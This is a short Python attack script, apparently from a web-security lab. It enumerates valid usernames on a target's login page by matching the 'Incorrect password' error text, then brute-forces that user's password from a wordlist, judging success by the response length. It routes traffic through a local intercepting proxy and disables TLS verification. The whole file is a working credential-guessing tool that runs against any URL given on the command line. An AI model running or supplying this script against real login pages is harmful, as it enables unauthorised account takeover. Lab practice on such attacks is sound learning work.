import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def getuser(lst, url, s):
    for i in lst:
        sys.stdout.write("\r" + " " * 80 + "\r")
        sys.stdout.write(f"\rTesting username: {i.strip()}")
        sys.stdout.flush()
        data = {'username': f'{i.strip()}', 'password': "itdoesnotmatter"}
        r = s.post(url, data=data, verify=False, proxies=proxies)
        if "Incorrect password" in r.text:
            sys.stdout.write("\n")
            return i.strip()
    sys.stdout.write("\n")
    return False

def getpass(user, plist, url, s):
    for i in plist:
        sys.stdout.write("\r" + " " * 80 + "\r")
        sys.stdout.write(f"\rTesting pass: {i.strip()}")
        sys.stdout.flush()
        data = {'username': f'{user}', 'password': f'{i.strip()}'}
        r = s.post(url, data=data, verify=False, proxies=proxies)
        
        if r.headers.get('Content-Length') != '6271':  # Adjust based on your observation of successful login response length
            sys.stdout.write("\n")
            return i.strip()
    sys.stdout.write("\n")
    return False

def main():
    try:
        url = sys.argv[1] + "login"
        usrlist = sys.argv[2]
        passwdlist = sys.argv[3]
        s = requests.Session()
        with open(usrlist, "r") as ulist:
            vuser = getuser(ulist, url, s)
        if vuser:
            print(f"User Found: {vuser}")
            with open(passwdlist, "r") as plist:
                vpass = getpass(vuser, plist, url, s)
            if vpass:
                print(f"Password Found: {vpass}")
            else:
                print("Error retrieving password")
        else:
            print("Error retrieving user")
    except IndexError:
        print("Usage: %s <url> <userListPath> <passwordListPath>" % sys.argv[0])
        sys.exit(-1)

if __name__ == '__main__':
    main()
